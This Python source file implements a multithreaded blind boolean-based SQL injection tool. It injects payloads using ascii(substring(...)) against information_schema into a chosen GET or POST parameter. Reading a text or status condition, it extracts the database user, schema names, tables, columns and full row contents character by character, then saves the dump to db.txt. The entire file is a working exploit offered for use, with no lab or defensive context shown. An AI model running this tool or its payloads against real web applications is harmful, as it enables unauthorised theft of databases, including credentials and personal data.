import requests
import time
import os
import re
import math
import concurrent.futures
from abc import ABC, abstractmethod
from pwn import log

import utils
import structs


# Global variables
stop_threads = True
character_finded = 0


# Strategies Classes
class Payload(ABC):

    @abstractmethod
    def build_payload(
        self,
        exploit: str,
        position: int,
        character: int,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> str:
        """Build the payload to be used in dependency on what you want to extract from the database"""
        pass


class ConditionalPayload(Payload):

    def build_payload(
        self,
        exploit: str,
        position: int,
        character: int,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> str:

        result = ""

        if exploit == "User":
            result = (
                f"' and (select ascii(substring(user(),{position},1)))='{character}"
            )
        elif exploit == "DBs":
            result = f"' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
        elif exploit == "Tables" and db is not None:
            result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
        elif exploit == "Columns" and db is not None and table is not None:
            result = f"' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
        elif exploit == "Rows" and db is not None and table is not None:
            columns = table.concat_columns()
            result = f"' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"

        return result


class Condition(ABC):

    def __init__(self, value: str):
        self._value = value

    def __str__(self) -> str:
        return self._value

    @abstractmethod
    def get_condition(self, response: requests.Response) -> bool:
        pass


class TextInCondition(Condition):

    def get_condition(self, response: requests.Response) -> bool:
        result = False

        if self._value in response.content.decode():
            result = True

        return result


class StatusEqualCondition(Condition):

    def get_condition(self, response: requests.Response) -> bool:
        result = False

        if self._value == str(response.status_code):
            result = True

        return result


class RequestType(ABC):
    _characters = (
        list(range(97, 123))
        + [95, 44, 64, 45]
        + list(range(48, 58))
        + list(range(33, 44))
        + [46, 47]
        + list(range(58, 64))
        + list(range(65, 95))
        + [96]
        + list(range(123, 127))
    )

    @abstractmethod
    def build_request(
        self,
        data,
        atribute_to_exploit: str,
        payload: Payload,
        main_url: str,
        headers: dict,
        info_name: str,
        position: int,
        condition: Condition,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> list:
        """Build the data for the request"""
        pass

    @abstractmethod
    def send_request(
        self,
        requests_data: structs.WrapperRequest,
    ) -> int | None:
        """Send the request that contain the payload"""
        pass


class PostRequest(RequestType):

    def __str__(self) -> str:
        return "POST"

    def build_request(
        self,
        data: dict,
        atribute_to_exploit: str,
        payload: Payload,
        main_url: str,
        headers: dict,
        info_name: str,
        position: int,
        condition: Condition,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> list:

        result = []

        for character in self._characters:
            concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
            copy_data = data.copy()
            copy_data[atribute_to_exploit] = concat_payload
            result.append(
                structs.WrapperRequest(
                    copy_data, character, main_url, headers, condition
                )
            )

        return result

    def send_request(
        self,
        requests_data: structs.WrapperRequest,
    ) -> int | None:
        global stop_threads
        global character_finded

        if stop_threads:
            return None

        response = requests.post(
            requests_data.main_url,
            headers=requests_data.headers,
            data=requests_data.data,
        )

        if requests_data.condition.get_condition(response):
            character_finded = requests_data.character
            stop_threads = True

        return requests_data.character


class GetRequest(RequestType):

    def __str__(self) -> str:
        return "GET"

    def build_request(
        self,
        data: str,
        atribute_to_exploit: str,
        payload: Payload,
        main_url: str,
        headers: dict,
        info_name: str,
        position: int,
        condition: Condition,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> list:

        result = []

        for character in self._characters:
            result.append(
                structs.WrapperRequest(
                    f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
                    character,
                    main_url,
                    headers,
                    condition,
                )
            )

        return result

    def send_request(
        self,
        requests_data: structs.WrapperRequest,
    ) -> int | None:
        global stop_threads
        global character_finded

        if stop_threads:
            return None

        response = requests.get(str(requests_data.data), headers=requests_data.headers)

        if requests_data.condition.get_condition(response):
            character_finded = requests_data.character
            stop_threads = True

        return requests_data.character


# Main Class
class Extractor:

    def __init__(
        self,
        main_url: str,
        headers: dict,
        data: str | dict,
        method: RequestType,
        condition: Condition,
        payload: Payload,
        num_threads: int = 1,
        atribute_to_exploit: str = "",
    ):
        self.main_url = main_url
        self.method = method
        self.headers = headers
        self.condition = condition
        self.payload = payload
        self.num_threads = num_threads
        self.data = data
        self.atribute_to_exploit = atribute_to_exploit
        self._dbs: list = []

    def _select_color(self, info_name: str) -> str:
        """Determines the color that is used to display different values of the DB"""

        switcher = {
            "User": utils.Color.UNDERLINE,
            "DBs": utils.Color.PURPLE,
            "Tables": utils.Color.CYAN,
            "Columns": utils.Color.BLUE,
            "Rows": utils.Color.BLUE,
        }

        return switcher.get(info_name, utils.Color.BLUE)

    def _get_info(
        self,
        label_info,
        label_menu,
        info_name: str,
        db: structs.DB | None = None,
        table: structs.Table | None = None,
    ) -> str:
        """Use Multithreads, build the payload and data to send the request"""

        global stop_threads

        stop_threads = True
        info = ""
        position = len(info) + 1

        while stop_threads:
            stop_threads = False

            requests_data = self.method.build_request(
                self.data,
                self.atribute_to_exploit,
                self.payload,
                self.main_url,
                self.headers,
                info_name,
                position,
                self.condition,
                db,
                table,
            )

            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.num_threads
            ) as executor:
                futures = {
                    executor.submit(self.method.send_request, data)
                    for data in requests_data
                }
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()

                    label_menu.status(chr(result))

                    if stop_threads:
                        executor.shutdown(wait=False)
                        break

            if stop_threads:
                info += chr(character_finded)
                label_info.status(
                    f"{self._select_color(info_name)}{info}{utils.Color.END}"
                )

            position += 1

        return info

    def get_user(self, label_menu) -> None:
        """Get the username that is running the DB process"""

        label_info = log.progress(utils.Color.YELLOW + "User" + utils.Color.END)
        self._get_info(label_info, label_menu, "User")
        print("\n")

    def get_dbs(self, label_menu) -> None:
        """Get the names of the data bases"""

        label_info = log.progress(utils.Color.YELLOW + "DBs" + utils.Color.END)
        info = self._get_info(label_info, label_menu, "DBs")

        new_dbs = info.split(",")
        for db_name in new_dbs:
            db = structs.DB(db_name, [])
            self._dbs.append(db)

        print("\n")

    def get_tables(self, label_menu) -> None:
        """Get the name of the tables of each db"""

        for db in self._dbs:

            label_info = log.progress(
                f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Tables{utils.Color.END}"
            )
            info = self._get_info(label_info, label_menu, "Tables", db)

            new_tables = info.split(",")
            for table_name in new_tables:
                table = structs.Table(table_name, [], [])
                db.tables.append(table)

        print("\n")

    def get_columns(self, label_menu) -> None:
        """Get the name of the columns of each table"""

        for db in self._dbs:

            for table in db.tables:

                label_info = log.progress(
                    f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Table{utils.Color.END}:{utils.Color.CYAN}{table.name}{utils.Color.END} {utils.Color.YELLOW}Columns{utils.Color.END}"
                )
                info = self._get_info(label_info, label_menu, "Columns", db, table)

                new_columns = info.split(",")
                for column_name in new_columns:
                    table.columns.append(column_name)

        print("\n")

    def get_rows(self, label_menu) -> None:
        """Get the content of each table"""

        for db in self._dbs:

            for table in db.tables:

                label_info = log.progress(
                    f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Table{utils.Color.END}:{utils.Color.CYAN}{table.name}{utils.Color.END} {utils.Color.YELLOW}Rows{utils.Color.END}"
                )

                info = self._get_info(label_info, label_menu, "Rows", db, table)

                new_rows = info.split(",")
                for row in new_rows:
                    table.rows.append(row)

        print("\n")

    def build_file(self) -> None:
        """Save all the data in a txt file"""

        with open("db.txt", "w") as f:
            for db in self._dbs:
                f.write("DB: " + db.name + "\n")
                for table in db.tables:
                    f.write("Table: " + table.name + "\n")
                    f.write("Colums: " + table.concat_columns() + "\n")
                    f.write("Rows: " + "\n")
                    for row in table.rows:
                        f.write(row + "\n")

                    f.write("\n\n")
                f.write("\n\n\n")

        print(
            f"\n\n[{utils.Color.YELLOW}!{utils.Color.END}] {utils.Color.BOLD}More details in db.txt{utils.Color.END}\n"
        )
